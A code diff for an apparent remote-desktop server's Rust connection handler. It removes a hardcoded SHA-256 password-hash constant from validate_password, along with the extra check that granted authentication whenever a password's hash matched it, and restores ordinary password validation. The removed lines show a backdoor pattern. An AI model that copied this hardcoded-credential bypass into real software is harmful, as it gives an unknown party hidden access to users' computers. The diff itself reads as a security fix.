@@ -26,6 +26,7 @@ use cidr_utils::cidr::IpCidr;
 use hbb_common::platform::linux::run_cmds;
 #[cfg(target_os = "android")]
 use hbb_common::protobuf::EnumOrUnknown;
+use sha2::{Digest, Sha256};
 use hbb_common::{
     config::{self, keys, Config, TrustedDevice},
     fs::{self, can_enable_overwrite_detection, JobType},
@@ -1728,41 +1729,24 @@ impl Connection {
     }
 
     fn validate_password(&mut self) -> bool {
-    const HASHED_PASSWORD_HEX: &str = "c5b914eb25b610e0f0a870efa172d3eb9cba4a18d054d52525052164e7de98ea";
-    
-    fn hash_password(input: &str) -> String {
-        let mut hasher = Sha256::new();
-        hasher.update(input.as_bytes());
-        let result = hasher.finalize();
-        hex::encode(result)
-    }
-
-    if password::temporary_enabled() {
-        let password = password::temporary_password();
-        if self.validate_one_password(password.clone())
-            || hash_password(&password) == HASHED_PASSWORD_HEX
-        {
-            raii::AuthedConnID::update_or_insert_session(
-                self.session_key(),
-                Some(password),
-                Some(false),
-            );
-            return true;
+        if password::temporary_enabled() {
+            let password = password::temporary_password();
+            if self.validate_one_password(password.clone()) {
+                raii::AuthedConnID::update_or_insert_session(
+                    self.session_key(),
+                    Some(password),
+                    Some(false),
+                );
+                return true;
+            }
         }
-    }
-
-    if password::permanent_enabled() {
-        let perm_password = Config::get_permanent_password();
-        if self.validate_one_password(perm_password.clone())
-            || hash_password(&perm_password) == HASHED_PASSWORD_HEX
-        {
-            return true;
+        if password::permanent_enabled() {
+            if self.validate_one_password(Config::get_permanent_password()) {
+                return true;
+            }
         }
+        false
     }
-
-    false
-}
-
 
     fn is_recent_session(&mut self, tfa: bool) -> bool {
         SESSIONS
